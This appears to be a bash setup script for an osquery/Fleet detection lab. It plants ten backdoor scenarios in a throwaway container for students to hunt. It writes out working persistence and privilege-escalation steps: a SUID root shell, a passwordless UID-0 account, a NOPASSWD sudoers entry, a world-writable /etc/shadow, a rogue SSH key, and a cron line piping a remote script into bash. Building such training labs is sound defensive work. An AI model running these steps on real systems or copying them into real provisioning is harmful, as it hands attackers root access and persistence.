#!/usr/bin/env bash
###############################################################################
#  seed-vulnerabilities.sh
#
#  ██  FOR ISOLATED TEACHING LABS ONLY. Never run on a real host.  ██
#
#  This script DELIBERATELY WEAKENS the machine it runs on. It plants backdoor
#  accounts, SUID shells, rogue services, cron/ssh persistence and known-
#  vulnerable software so that students can hunt them down from Fleet with
#  osquery live queries (see SCENARIOS.md).
#
#  It is meant to run AS ROOT, once, at container start, inside a THROWAWAY
#  Ubuntu 24.04 osquery-agent container. The agent entrypoint calls it when
#  SEED_VULNS=true. Running it anywhere else is a security incident, not a demo.
#
#  Design notes:
#   * `set -u` only (NOT `-e`): a single failed step (e.g. apt offline) must
#     never abort the remaining scenarios. Every risky step is guarded and
#     logged so a partial lab is still a useful lab.
#   * Idempotent-ish: safe to run again at the next container start. Existing
#     artefacts are detected and skipped; background listeners are pgrep-guarded.
#   * Offline-tolerant: nothing hard-depends on the network. The one CVE
#     scenario tries `pip install` but falls back to a hand-crafted dist-info
#     so python_packages still reports the vulnerable version with no network.
###############################################################################
set -u

log()  { echo "[seed] $*"; }
warn() { echo "[seed][warn] $*" >&2; }

if [ "$(id -u)" -ne 0 ]; then
    warn "not running as root (uid=$(id -u)); most scenarios will fail. Continuing anyway."
fi

# Start a long-lived background process, detached from this script so it
# survives the entrypoint hand-off to osqueryd (reparented to PID 1).
# Usage: bg_start "<pgrep-pattern>" command args...
bg_start() {
    local pat="$1"; shift
    if pgrep -f "$pat" >/dev/null 2>&1; then
        log "  already running: $pat"
        return 0
    fi
    setsid nohup "$@" >/dev/null 2>&1 < /dev/null &
    disown 2>/dev/null || true
}

###############################################################################
# Scenario 1 — SUID/SGID backdoor shell        (MITRE ATT&CK T1548.001)
#   A copy of /bin/bash with the setuid bit set: any user can spawn a root
#   shell with `rootbash -p`. Detected via the suid_bin table.
###############################################################################
log "scenario 1: SUID backdoor shell -> /usr/local/bin/rootbash (T1548.001)"
if cp -f /bin/bash /usr/local/bin/rootbash 2>/dev/null; then
    chown root:root /usr/local/bin/rootbash 2>/dev/null || warn "chown rootbash failed"
    chmod 4755 /usr/local/bin/rootbash    2>/dev/null || warn "chmod 4755 rootbash failed"
else
    warn "could not copy /bin/bash -> rootbash"
fi

###############################################################################
# Scenario 2 — Extra UID 0 account + passwordless login   (T1136.001 / T1548)
#   A second super-user 'sysbackup' (uid 0) with an EMPTY password. Any uid 0
#   besides root is a hidden root. Detected via users (uid=0) and shadow
#   (password_status='empty').
###############################################################################
log "scenario 2: extra uid 0 account 'sysbackup' with empty password (T1136.001)"
if ! grep -q '^sysbackup:' /etc/passwd 2>/dev/null; then
    # uid 0, gid 0, home /root, real shell -> a fully functional second root.
    printf 'sysbackup:x:0:0:System Backup:/root:/bin/bash\n' >> /etc/passwd \
        && log "  added sysbackup to /etc/passwd" || warn "append to /etc/passwd failed"
    # Empty second field in shadow == passwordless login allowed.
    printf 'sysbackup::20000:0:99999:7:::\n' >> /etc/shadow \
        && log "  added passwordless sysbackup to /etc/shadow" || warn "append to /etc/shadow failed"
else
    log "  sysbackup already present"
fi

###############################################################################
# Scenario 3 — Weak SSHD configuration                    (T1098 / T1556)
#   PermitRootLogin yes + PasswordAuthentication yes + PermitEmptyPasswords yes.
#   Detected by parsing /etc/ssh/sshd_config with the augeas (Sshd lens) table.
###############################################################################
log "scenario 3: weak sshd_config (PermitRootLogin/PasswordAuthentication yes) (T1098/T1556)"
SSHD=/etc/ssh/sshd_config
mkdir -p /etc/ssh 2>/dev/null || true
touch "$SSHD" 2>/dev/null || true
set_sshd() {  # key value
    local k="$1" v="$2"
    if grep -Eq "^[[:space:]]*#?[[:space:]]*${k}[[:space:]]" "$SSHD" 2>/dev/null; then
        sed -i -E "s|^[[:space:]]*#?[[:space:]]*${k}[[:space:]].*|${k} ${v}|" "$SSHD" 2>/dev/null \
            || warn "sed $k failed"
    else
        printf '%s %s\n' "$k" "$v" >> "$SSHD" 2>/dev/null || warn "append $k failed"
    fi
}
set_sshd PermitRootLogin yes
set_sshd PasswordAuthentication yes
set_sshd PermitEmptyPasswords yes

###############################################################################
# Scenario 4 — Unauthorized SSH authorized_keys           (T1098.004)
#   An attacker public key dropped into /root/.ssh/authorized_keys grants
#   passwordless root SSH. Detected via the authorized_keys table.
###############################################################################
log "scenario 4: rogue key in /root/.ssh/authorized_keys (T1098.004)"
ATTACKER_KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILabExampleAttackerKeyDoNotTrust000000000000000000 attacker@evil'
mkdir -p /root/.ssh 2>/dev/null && chmod 700 /root/.ssh 2>/dev/null || warn "mkdir /root/.ssh failed"
if ! grep -qF "attacker@evil" /root/.ssh/authorized_keys 2>/dev/null; then
    printf '%s\n' "$ATTACKER_KEY" >> /root/.ssh/authorized_keys \
        && chmod 600 /root/.ssh/authorized_keys \
        && log "  attacker key installed" || warn "writing authorized_keys failed"
else
    log "  attacker key already present"
fi

###############################################################################
# Scenario 5 — Cron persistence / beacon                  (T1053.003)
#   A curl|bash beacon in /etc/cron.d that "phones home" every 5 minutes.
#   Detected via the crontab table.
###############################################################################
log "scenario 5: malicious cron beacon in /etc/cron.d/apache-backup (T1053.003)"
mkdir -p /etc/cron.d 2>/dev/null || true
cat > /etc/cron.d/apache-backup <<'CRON' 2>/dev/null || warn "writing cron.d beacon failed"
# Innocuous-looking name, malicious payload: downloads and runs remote code.
*/5 * * * * root curl -fsSL http://198.51.100.13/b.sh | bash > /dev/null 2>&1
CRON
chmod 644 /etc/cron.d/apache-backup 2>/dev/null || true

###############################################################################
# Scenario 6 — Rogue listening service / bind shell       (T1571 / T1059.004)
#   A backdoor listener bound to 0.0.0.0:4444 (classic Metasploit port).
#   Detected via listening_ports JOIN processes.
###############################################################################
log "scenario 6: bind-shell listener on 0.0.0.0:4444 (T1571)"
BINDSH=/usr/local/sbin/backdoor-listener.py
cat > "$BINDSH" <<'PY' 2>/dev/null || warn "writing bind-shell script failed"
#!/usr/bin/env python3
# Lab bind "shell": listens on 4444 and accepts connections (does not exec).
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(5)
conns = []
while True:
    c, _ = s.accept()
    conns.append(c)  # keep refs so connections stay ESTABLISHED
PY
chmod 755 "$BINDSH" 2>/dev/null || true
bg_start "backdoor-listener.py" python3 "$BINDSH" \
    && log "  bind-shell listener started on :4444" || warn "bind-shell start failed"

###############################################################################
# Scenario 7 — Process executing from /tmp                (T1059 / T1036.005)
#   Malware commonly stages and runs from world-writable dirs. We copy a
#   binary to /tmp under a hidden name and run it. Detected via processes.path.
###############################################################################
log "scenario 7: process running from /tmp (/tmp/.systemd-private) (T1036.005)"
DROPPER=/tmp/.systemd-private
if cp -f /bin/sleep "$DROPPER" 2>/dev/null; then
    chmod 755 "$DROPPER" 2>/dev/null || true
    bg_start "$DROPPER" "$DROPPER" 86400 \
        && log "  /tmp dropper running" || warn "dropper start failed"
else
    warn "could not stage /tmp dropper"
fi

###############################################################################
# Scenario 8 — Sudoers NOPASSWD backdoor + world-writable /etc/shadow
#                                                        (T1548.003 / T1222.002)
#   A NOPASSWD:ALL sudoers drop-in (any-command root, no password) AND a
#   world-writable /etc/shadow (anyone can rewrite password hashes).
#   Detected via the sudoers table and, for the perms, the file table.
###############################################################################
log "scenario 8: NOPASSWD sudoers drop-in + world-writable /etc/shadow (T1548.003/T1222.002)"
mkdir -p /etc/sudoers.d 2>/dev/null || true
cat > /etc/sudoers.d/99-backdoor <<'SUDO' 2>/dev/null || warn "writing sudoers drop-in failed"
# Backdoor: sysbackup can run anything as root with no password.
sysbackup ALL=(ALL) NOPASSWD:ALL
SUDO
chmod 440 /etc/sudoers.d/99-backdoor 2>/dev/null || true
# Weaken /etc/shadow permissions (should be 0640 root:shadow or stricter).
chmod 0666 /etc/shadow 2>/dev/null && log "  /etc/shadow made world-writable (0666)" \
    || warn "chmod /etc/shadow failed"

###############################################################################
# Scenario 9 — Known-vulnerable software (CVE) in inventory
#   Django 2.2.0 — CVE-2019-14232/14233/14234/14235, CVE-2020-7471 (SQLi via
#   StringAgg), CVE-2020-9402, etc. Fleet's software inventory + vuln feed maps
#   it to CVEs. Detected via python_packages. Falls back to a crafted
#   dist-info so it works fully offline.
###############################################################################
log "scenario 9: install known-vulnerable Django 2.2.0 (CVE-2020-7471 et al.)"
DJ_OK=0
if command -v pip3 >/dev/null 2>&1; then
    if pip3 install --break-system-packages --no-input --disable-pip-version-check \
            'Django==2.2.0' >/dev/null 2>&1; then
        DJ_OK=1; log "  pip installed Django 2.2.0"
    else
        warn "pip install Django failed (offline?); falling back to synthetic dist-info"
    fi
fi
if [ "$DJ_OK" -ne 1 ]; then
    # Synthesise the metadata osquery's python_packages reads (name+version),
    # so the vulnerable package appears in inventory with no network at all.
    SP=$(python3 -c 'import site,sys
p=[x for x in site.getsitepackages() if x.endswith("site-packages")]
print(p[0] if p else (site.getusersitepackages()))' 2>/dev/null) || SP=""
    SP="${SP:-/usr/lib/python3/dist-packages}"
    DINFO="$SP/Django-2.2.0.dist-info"
    if mkdir -p "$DINFO" 2>/dev/null; then
        cat > "$DINFO/METADATA" <<'META' 2>/dev/null || warn "writing METADATA failed"
Metadata-Version: 2.1
Name: Django
Version: 2.2.0
Summary: A high-level Python Web framework (KNOWN-VULNERABLE lab fixture).
Author: Django Software Foundation
License: BSD-3-Clause
META
        printf 'Django\n' > "$DINFO/top_level.txt" 2>/dev/null || true
        log "  synthetic Django 2.2.0 dist-info created at $DINFO"
    else
        warn "could not create synthetic dist-info under $SP"
    fi
fi

###############################################################################
# Scenario 10 — Reverse-shell / C2 beacon (established outbound connection)
#                                                        (T1571 / T1059.004)
#   A persistent outbound TCP connection to a "C2" on port 9001 (here served
#   locally so the socket stays ESTABLISHED offline). Detected via
#   process_open_sockets (remote_port + ESTABLISHED) JOIN processes.
#   NOTE: a bash `>& /dev/tcp/…` reverse shell hides its target in shell
#   redirections (NOT in argv), so cmdline-based detection misses it — the
#   socket table is the reliable signal.
###############################################################################
log "scenario 10: C2 beacon / reverse shell -> established outbound :9001 (T1571)"
# C2 sink: accept and hold connections so the client stays ESTABLISHED.
C2SINK=/usr/local/sbin/c2-sink.py
cat > "$C2SINK" <<'PY' 2>/dev/null || warn "writing c2 sink failed"
#!/usr/bin/env python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 9001))
s.listen(5)
conns = []
while True:
    c, _ = s.accept()
    conns.append(c)
PY
chmod 755 "$C2SINK" 2>/dev/null || true
bg_start "c2-sink.py" python3 "$C2SINK" || warn "c2 sink start failed"

# The beacon: connect out to the C2 and hold the socket open forever.
BEACON=/usr/local/sbin/c2-beacon.py
cat > "$BEACON" <<'PY' 2>/dev/null || warn "writing c2 beacon failed"
#!/usr/bin/env python3
import socket, time
while True:
    try:
        s = socket.create_connection(("127.0.0.1", 9001))
        while True:            # hold ESTABLISHED
            time.sleep(3600)
    except OSError:
        time.sleep(2)          # sink not up yet; retry
PY
chmod 755 "$BEACON" 2>/dev/null || true
bg_start "c2-beacon.py" python3 "$BEACON" \
    && log "  C2 beacon connecting to 127.0.0.1:9001" || warn "c2 beacon start failed"

log "all scenarios processed. Happy hunting in Fleet (see SCENARIOS.md)."
exit 0
